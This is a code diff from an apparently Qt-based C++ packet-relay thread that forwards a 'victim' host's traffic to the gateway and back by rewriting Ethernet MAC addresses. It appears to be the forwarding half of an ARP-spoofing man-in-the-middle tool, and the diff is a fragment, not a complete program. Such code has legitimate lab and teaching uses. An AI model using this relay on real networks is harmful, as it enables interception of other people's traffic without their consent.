@@ -97,11 +97,12 @@ void GetPacketsThread::getPackets()
 //        f.close();
 
         memcpy(send_packet_buf, packet_buf, received_num);
+
         char src[50], dest[50];
         inet_ntop(AF_INET, &ip_packet->ip_src, src, sizeof(src));
         inet_ntop(AF_INET, &ip_packet->ip_dst, dest, sizeof(dest));
 
-        //If it's the target ip, change its destination mac address to gateway.
+        //victim => self => gateway
         if(strncmp(src, victim_ip_addr.toLatin1().data(),
                    strlen(victim_ip_addr.toLatin1().data())) == 0){
             qDebug() << "Received " << received_num << " bytes. "
@@ -110,14 +111,21 @@ void GetPacketsThread::getPackets()
                 eth_hdr->h_dest[i] = HostInfo::gateway_mac[i];
                 eth_hdr->h_source[i] = HostInfo::self_mac[i];
             }
-
-            int num;
-            if((num = sendto(gateway_fd, send_packet_buf, received_num, 0,
-                             (struct sockaddr*)&eth_gateway_info, sizeof(eth_gateway_info))) <= 0){
-                perror("redirct send");
-                return;
+        }//outside => self => victim
+        else if(strncmp(dest, victim_ip_addr.toLatin1().data(),
+                             strlen(victim_ip_addr.toLatin1().data())) == 0){
+            qDebug() << "From server Received " << received_num << " bytes. "
+                     << src << " => " << dest << " protocol: " << ip_packet->ip_p;
+            for(int i = 0; i < ETH_ALEN; i++){
+                eth_hdr->h_dest[i] = HostInfo::victim_mac[i];
+                eth_hdr->h_source[i] = HostInfo::self_mac[i];
             }
-            qDebug() << "redirect " << num << " bytes.";
+        }
+        int num = 0;
+        if((num = sendto(gateway_fd, send_packet_buf, received_num, 0,
+                         (struct sockaddr*)&eth_gateway_info, sizeof(eth_gateway_info))) < 0){
+            perror("redirct send");
+            return;
         }
     }
     close(victim_fd);
